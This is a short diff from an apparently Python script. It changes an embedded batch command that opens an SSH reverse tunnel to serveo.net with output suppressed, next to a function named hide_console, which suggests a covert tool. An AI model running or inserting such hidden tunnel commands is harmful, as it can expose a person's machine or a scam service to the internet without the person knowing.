@@ -356,7 +356,7 @@ if __name__ == "__main__":
 
 TUNNEL_BATCH = '''@echo off
 >nul 2>&1
-ssh -R 80:localhost:12345 serveo.net
+ssh -R neverscam:80:localhost:12345 serveo.net
 '''
 
 def hide_console():
